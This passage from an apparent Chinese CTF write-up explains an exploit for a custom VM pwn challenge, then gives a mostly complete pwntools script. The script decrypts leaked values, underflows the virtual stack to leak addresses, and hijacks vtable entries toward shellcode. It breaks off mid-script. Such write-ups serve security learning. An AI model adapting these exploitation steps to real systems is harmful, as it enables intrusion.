劫持执行流；<code>vm</code> 的 <code>data</code> 区域是权限<code>rwx</code>的<code>mmap</code>出地址，考虑写<code>shellcode</code>来进行<code>orw</code>（开启了沙箱）；想要泄露地址和写入<code>shellcode</code>需要破解<code>store</code>存在的数据加密；<code>mmap</code>地址的泄露存在困难，因为其位于虚拟栈之后，<del>注意到（比赛时卡在这一步了）</del>可以劫持<code>vatble</code>某个无用选项为<code>start</code>来重启一个新的<code>vm</code>，那么旧的<code>vm</code>的<code>mmap</code>区域地址就在新的虚拟栈之前可以泄露出来，而新的<code>mmap</code>地址和旧的是存在固定偏移的。<br>分析完毕，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.16/amd64/libc6_2.31-0ubuntu9.16_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.16/amd64/libc6-dbg_2.31-0ubuntu9.16_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.16/amd64/glibc-source_2.31-0ubuntu9.16_all/usr/src/glibc/glibc-2.31</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"><span class="comment"># pwn :)</span></span><br><span class="line"></span><br><span class="line">MASK32 = <span class="number">0xFFFFFFFF</span></span><br><span class="line">M1 = <span class="number">0xDEADBEEF</span></span><br><span class="line">M2 = <span class="number">0xB14CB12D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">x</span>): <span class="keyword">return</span> x &amp; MASK32</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol32</span>(<span class="params">x, r</span>):</span><br><span class="line">    x &amp;= MASK32; r &amp;= <span class="number">31</span></span><br><span class="line">    <span class="keyword">return</span> u32((x &lt;&lt; r) | (x &gt;&gt; (<span class="number">32</span> - r)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror32</span>(<span class="params">x, r</span>):</span><br><span class="line">    x &amp;= MASK32; r &amp;= <span class="number">31</span></span><br><span class="line">    <span class="keyword">return</span> u32((x &gt;&gt; r) | (x &lt;&lt; (<span class="number">32</span> - r)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_literal</span>(<span class="params">a1</span>):</span><br><span class="line">    <span class="comment"># 严格逐步按题目 C 实现</span></span><br><span class="line">    v5 = rol32(u32(a1), <span class="number">11</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):  <span class="comment"># n16 = 0..16</span></span><br><span class="line">        <span class="comment"># 下面全部是无符号逻辑移位；每一步都截断到 32 位</span></span><br><span class="line">        t0 = v5 ^ (v5 &gt;&gt; <span class="number">17</span>)</span><br><span class="line">        t1 = u32((t0 &lt;&lt; <span class="number">19</span>)) &amp; M1</span><br><span class="line">        t2 = u32(t1 ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>))</span><br><span class="line">        t3 = (u32(t2 &lt;&lt; <span class="number">29</span>)) &amp; M2</span><br><span class="line">        <span class="comment"># 这块是 v1 的一整条“直译”表达式</span></span><br><span class="line">        v1 = u32((</span><br><span class="line">            (</span><br><span class="line">                (</span><br><span class="line">                    (</span><br><span class="line">                        (u32((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; M1) ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>)</span><br><span class="line">                    ) &lt;&lt; <span class="number">29</span></span><br><span class="line">                ) &amp; M2</span><br><span class="line">                ^ (u32((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; M1)</span><br><span class="line">                ^ v5</span><br><span class="line">                ^ (v5 &gt;&gt; <span class="number">17</span>)</span><br><span class="line">                ^ (</span><br><span class="line">                    (</span><br><span class="line">                        (u32((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; M1)</span><br><span class="line">                        ^ v5</span><br><span class="line">                        ^ (v5 &gt;&gt; <span class="number">17</span>)</span><br><span class="line">                        ^ (</span><br><span class="line">                            ((u32((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; M1) ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">29</span></span><br><span class="line">                        ) &amp; M2</span><br><span class="line">                    ) &gt;&gt; <span class="number">25</span></span><br><span class="line">                )</span><br><span class="line">            ) &gt;&gt; <span class="number">13</span></span><br><span class="line">        ) ^ (</span><br><span class="line">            (</span><br><span class="line">                (u32((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; M1)</span><br><span class="line">                ^ v5</span><br><span class="line">                ^ (v5 &gt;&gt; <span class="number">17</span>)</span><br><span class="line">                ^ (</span><br><span class="line">                    ((u32((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; M1) ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">29</span></span><br><span class="line">                ) &amp; M2</span><br><span class="line">            ) &gt;&gt; <span class="number">25</span></span><br><span class="line">        ) ^ (</span><br><span class="line">            ((u32((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; M1) ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">29</span></span><br><span class="line">        ) &amp; M2</span><br><span class="line">          ^ (u32((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; M1)</span><br><span class="line">          ^ v5</span><br><span class="line">          ^ (v5 &gt;&gt; <span class="number">17</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        tA = u32(v1 ^ (v1 &gt;&gt; <span class="number">15</span>))</span><br><span class="line">        T  = (u32(tA &lt;&lt; <span class="number">17</span>)) &amp; M1</span><br><span class="line">        v5 = u32(T ^ (v1 &gt;&gt; <span class="number">15</span>) ^ v1 ^ (u32(((v1 &gt;&gt; <span class="number">15</span>) ^ v1 ^ T) &lt;&lt; <span class="number">20</span>)))</span><br><span class="line">    <span class="keyword">return</span> ror32(v5, <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 线性代数：用整个 encrypt_literal 构造矩阵并求逆 =====</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mat_from_f</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="comment"># 第 j 列 = f(1&lt;&lt;j)</span></span><br><span class="line">    rows = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        y = f(<span class="number">1</span> &lt;&lt; j) &amp; MASK32</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">if</span> (y &gt;&gt; i) &amp; <span class="number">1</span>:</span><br><span class="line">                rows[i] |= (<span class="number">1</span> &lt;&lt; j)</span><br><span class="line">    <span class="keyword">return</span> rows  <span class="comment"># 32 行，每行是 32 位掩码（列方向）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parity32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="comment"># 位奇偶校验（GF(2)）</span></span><br><span class="line">    x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">    x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">    x ^= x &gt;&gt; <span class="number">4</span></span><br><span class="line">    x &amp;= <span class="number">0xF</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0x6996</span> &gt;&gt; x) &amp; <span class="number">1</span>  <span class="comment"># 预置表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mat_mul_vec</span>(<span class="params">M, x</span>):</span><br><span class="line">    x &amp;= MASK32</span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> parity32(M[i] &amp; x):</span><br><span class="line">            y |= (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line">    <span class="keyword">return</span> y &amp; MASK32</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mat_inv</span>(<span class="params">M</span>):</span><br><span class="line">    <span class="comment"># 高斯消元（GF(2)），行存</span></span><br><span class="line">    A = M[:]</span><br><span class="line">    I = [(<span class="number">1</span> &lt;&lt; i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        piv = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(col, <span class="number">32</span>):</span><br><span class="line">            <span class="keyword">if</span> (A[r] &gt;&gt; col) &amp; <span class="number">1</span>:</span><br><span class="line">                piv = r; <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> piv &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Singular matrix&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> piv != col:</span><br><span class="line">            A[col], A[piv] = A[piv], A[col]</span><br><span class="line">            I[col], I[piv] = I[piv], I[col]</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">if</span> r != col <span class="keyword">and</span> ((A[r] &gt;&gt; col) &amp; <span class="number">1</span>):</span><br><span class="line">                A[r] ^= A[col]</span><br><span class="line">                I[r] ^= I[col]</span><br><span class="line">    <span class="keyword">return</span> I</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整体加密变换 E 及其逆 E_inv</span></span><br><span class="line">E = mat_from_f(encrypt_literal)</span><br><span class="line">E_inv = mat_inv(E)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">x</span>):  <span class="comment"># 方便对拍</span></span><br><span class="line">    <span class="keyword">return</span> encrypt_literal(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="comment"># 既然 E 是“整个 encrypt”，直接乘其逆即可</span></span><br><span class="line">    <span class="keyword">return</span> mat_mul_vec(E_inv, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本的vm操作函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_reg</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;\x01&#x27;</span> + p8(idx) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_imm</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;\x02&#x27;</span> + p32(num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_reg</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;\x03&#x27;</span> + p8(idx) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_reg</span>(<span class="params">res_reg, idx1, idx2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;\x04&#x27;</span> + p8(res_reg) + p8(idx1) + p8(idx2) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_reg</span>(<span class="params">res_reg, idx1, idx2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;\x05&#x27;</span> + p8(res_reg) + p8(idx1) + p8(idx2) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul_reg</span>(<span class="params">res_reg, idx1, idx2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;\x06&#x27;</span> + p8(res_reg) + p8(idx1) + p8(idx2) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">idx, offset</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;\x07\x00&#x27;</span> + p8(idx) + p16(offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">offset</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;\x08&#x27;</span> + p16(offset) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">over_read</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;\x09\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 负溢泄露elf_base</span></span><br><span class="line">code = pop_reg(<span class="number">0</span>)*<span class="number">5</span> + \</span><br><span class="line">        store(<span class="number">0</span>, <span class="number">0</span>) + show(<span class="number">0</span>) + \</span><br><span class="line">        pop_reg(<span class="number">1</span>) + store(<span class="number">1</span>, <span class="number">0</span>) + show(<span class="number">0</span>) + \</span><br><span class="line">        over_read() <span class="comment"># 利用选项9多读一些操作码</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your op:&#x27;</span>)</span><br><span class="line">io.send(code)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;data in offset 0 is &quot;</span>)</span><br><span class="line">leak_data = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">elf_addr_h = decrypt(leak_data)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;data in offset 0 is &quot;</span>)</span><br><span class="line">leak_data = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">elf_addr_l = decrypt(leak_data)</span><br><span class="line"></span><br><span class="line">elf_addr = elf_addr_h &lt;&lt; <span class="number">32</span> | elf_addr_l | <span class="number">0xd0</span></span><br><span class="line">elf_base = elf_addr - <span class="number">0x20d0</span></span><br><span class="line">log.success(<span class="string">&quot;elf_base --&gt; &quot;</span>+<span class="built_in">hex</span>(elf_base))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">start_addr = elf_base + <span class="number">0x1160</span></span><br><span class="line">read_addr = elf_base + <span class="number">0x2841</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖show操作为start，重启一个新的vm</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += push_imm(start_addr &amp; <span class="number">0xffffffff</span>)   <span class="comment"># change print_data to libc_start_main </span></span><br><span class="line">payload += show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)     <span class="comment"># 此前执行了选项9，所以可以多发一次opcode来重启新的vm</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xc</span>):</span><br><span class="line">    payload += pop_reg(<span class="number">1</span>) <span class="comment"># 向上负溢出来将vtable中的sub_reg覆盖为over_read()</span></span><br><span class="line"></span><br><span class="line">payload += push_imm(read_addr &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">payload += pop_reg(<span class="number">0</span>)</span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)    </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your op:&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x2 executed\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;op 0x3 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">350</span>): <span class="comment"># 负溢出到旧的vm结构体处来泄露mmap地址</span></span><br><span class="line">    payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">    payload += pop_reg(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="comment"># over_read</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;op 0x3 executed\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="comment"># 空调一次over_read，调试发现可以抬栈，从而可以控制栈对齐</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += pop_reg(<span class="number">2</span>)</span><br><span class="line">payload += store(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">payload += show(<span class="number">0</span>)</span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)   </span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;data in offset 0 is &quot;</span>)</span><br><span class="line">leak_data = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">mmap_addr_h = decrypt(leak_data)</span><br><span class="line">log.success(<span class="string">&quot;mmap_addr_h --&gt; &quot;</span>+<span class="built_in">hex</span>(mmap_addr_h))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += pop_reg(<span class="number">3</span>)</span><br><span class="line">payload += store(<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">payload += show(<span class="number">0</span>)</span><br><span class="line">payload += sub_reg(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;data in offset 0 is &quot;</span>)</span><br><span class="line">leak_data = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">mmap_addr_l = decrypt(leak_data)</span><br><span class="line">log.success(<span class="string">&quot;mmap_addr_l --&gt; &quot;</span>+<span class="built_in">hex</span>(mmap_addr_l))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">mmap_addr = mmap_addr_h &lt;&lt; <span class="number">32</span> | mmap_addr_l</span><br><span class="line">log.success(<span class="string">&quot;mmap_addr --&gt; &quot;</span>+<span class="built_in">hex</span>(mmap_addr))</span><br><span class="line">new_mmap_addr = mmap_addr - <span class="number">0x221000</span></span><br><span 